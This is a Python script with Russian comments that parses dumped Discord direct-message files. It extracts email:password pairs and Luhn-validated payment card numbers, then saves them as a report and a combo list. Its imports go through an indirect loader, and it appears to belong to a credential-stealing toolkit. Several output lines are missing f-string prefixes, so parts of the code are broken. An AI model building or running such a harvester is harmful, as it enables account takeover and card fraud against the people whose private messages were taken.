from core.resolver import (Resolver, _OS, _RE, _TYPING)
os = Resolver.get_mod(_OS)
re = Resolver.get_mod(_RE)
typing_mod = Resolver.get_mod(_TYPING)
Any, Dict, List, Optional, Union = typing_mod.Any, typing_mod.Dict, typing_mod.List, typing_mod.Optional, typing_mod.Union

"""
discord_parser.py — парсер email:pass из выгруженных Discord DM файлов.
Запуск: python core/discord_parser.py <папка_или_файл>
"""
import sys
_EMAIL_RE = re.compile("[a-zA-Z0-9_.+\\-]+@[a-zA-Z0-9\\-]+\\.[a-zA-Z]{2,6}\\b")
_PASS_RE  = re.compile(
    r'(?:' +
    "pass(?:word)?|пароль|passwd|pwd" +
    ")[=:\\s\\-»→:]+([^\\s,\\" + r'[\x21-\x7E]{4,64})',
    re.IGNORECASE
)
_CARD_SPACED_RE = re.compile("\\b\\d{4}[ \\-]\\d{4}[ \\-]\\d{4}[ \\-]\\d{3,4}\\b")
_CARD_PLAIN_RE  = re.compile("\\b[3456]\\d{12,15}\\b")   
_PAIR_RE  = re.compile(
    "([a-zA-Z0-9_.+\\-]+@[a-zA-Z0-9\\-]+\\.[a-zA-Z]{2,6}\\b)" +
    "[\\s:;\\|,]+" +
    "([^\\s:;\\|,<>]{4,64})"
)
_DISCORD_URL_RE = re.compile(
    "https?://(?:cdn|media)\\.discordapp\\.(?:net|com)/\\S+"
)
def _luhn(number: str) -> bool:
    "Проверка Luhn — отсеивает случайные числа."
    digits = [int(d) for d in number if d.isdigit()]
    odd = digits[-1::-2]
    even = [d*2 - 9 if d*2 > 9 else d*2 for d in digits[-2::-2]]
    return (sum(odd) + sum(even)) % 10 == 0
def _clean_line(line: str) -> str:
    "Убираем Discord CDN-ссылки из строки перед парсингом."
    return _DISCORD_URL_RE.sub('', line)
def parse_file(path: str) -> List[Dict[str, str]]:
    found = []
    if os.path.basename(path).startswith(("discord_credentials", "_CREDENTIALS")):
        return found
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
    except Exception:
        return found
    for lineno, line in enumerate(lines, 1):
        clean = _clean_line(line)
        for m in _PAIR_RE.finditer(clean):
            email, password = m.group(1), m.group(2)
            if password in ("[IMG]", "[GIF]", "[VIDEO]", "[AUDIO]", "[ATTACH]") or password.startswith("[FILE:"):
                continue
            found.append({
                "type":     "PAIR",
                "email":    email,
                "password": password,
                "line":     lineno,
                "source":   os.path.basename(path),
                "context":  line.strip()[:120],
            })
        emails_in_line = _EMAIL_RE.findall(clean)
        passes_in_line = _PASS_RE.findall(clean)
        if emails_in_line and passes_in_line:
            for email in emails_in_line:
                for pw in passes_in_line:
                    if not any(r.get("email") == email and r.get("password") == pw
                               for r in found):
                        found.append({
                            "type":     "PAIR",
                            "email":    email,
                            "password": pw,
                            "line":     lineno,
                            "source":   os.path.basename(path),
                            "context":  line.strip()[:120],
                        })
        for m in _CARD_SPACED_RE.finditer(clean):
            digits = re.sub("[ \\-]", '', m.group(0))
            if _luhn(digits):
                found.append({
                    "type":    "CARD",
                    "value":   m.group(0),
                    "line":    lineno,
                    "source":  os.path.basename(path),
                    "context": line.strip()[:120],
                })
        for m in _CARD_PLAIN_RE.finditer(clean):
            num = m.group(0)
            if _luhn(num):
                found.append({
                    "type":    "CARD",
                    "value":   num,
                    "line":    lineno,
                    "source":  os.path.basename(path),
                    "context": line.strip()[:120],
                })
    return found
def parse_folder(folder: str) -> List[Dict[str, str]]:
    all_results = []
    try:
        for fname in os.listdir(folder):
            if fname.endswith(".txt"):
                all_results.extend(parse_file(os.path.join(folder, fname)))
    except Exception:
        pass
    seen = set()
    unique = []
    for r in all_results:
        if r["type"] == "PAIR":
            key = ("PAIR", r.get("email", "").lower(), r.get("password", ""))
        else:
            key = ("CARD", r.get("value", ""))
        if key not in seen:
            seen.add(key)
            unique.append(r)
    return unique
def format_results(results: List[Dict[str, str]]) -> str:
    pairs = [r for r in results if r.get("type") == "PAIR"]
    cards = [r for r in results if r.get("type") == "CARD"]
    if not results:
        return "❌ Ничего не найдено."
    lines = ["🔑 ═══ DISCORD CREDENTIALS REPORT ═══ 🔑",
             "Пар email:pass: {len(pairs)}   Карт: {len(cards)}", ""]
    if pairs:
        lines.append("── EMAIL:PASS ──")
        for r in pairs:
            lines.append("{r[\'email\']}:{r[\'password\']}")
            lines.append("📄 {r[\'source\']}:{r[\'line\']} → {r[\'context\'][:80]}")
            lines.append("")
    if cards:
        lines.append("── КАРТЫ ──")
        for r in cards:
            lines.append(f"{r['value']}")
            lines.append("📄 {r[\'source\']}:{r[\'line\']} → {r[\'context\'][:80]}")
            lines.append("")
    lines.append("═" * 40)
    return "\n".join(lines)
def save_results(results: List[Dict[str, str]], out_path: str):
    "Сохраняет результаты в двух форматах: readable и credential-only."
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(format_results(results))
    combo_path = out_path.replace(".txt", "_combo.txt")
    with open(combo_path, "w", encoding="utf-8") as f:
        for r in results:
            if r.get("type") == "PAIR":
                f.write("{r[\'email\']}:{r[\'password\']}\\n")
            elif r.get("type") == "CARD":
                f.write("CARD:{r[\'value\']}\\n")
    return combo_path
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Использование: python discord_parser.py <папка_или_файл>")
        sys.exit(1)
    target = sys.argv[1]
    if os.path.isdir(target):
        results = parse_folder(target)
    elif os.path.isfile(target):
        results = parse_file(target)
    else:
        print("❌ Не найдено: {target}")
        sys.exit(1)
    print(format_results(results))
    if results:
        out = os.path.join(target if os.path.isdir(target) else os.path.dirname(target),
                           "discord_credentials.txt")
        combo = save_results(results, out)
        print("\\n✅ Сохранено: {out}")
        print("✅ Combo: {combo}")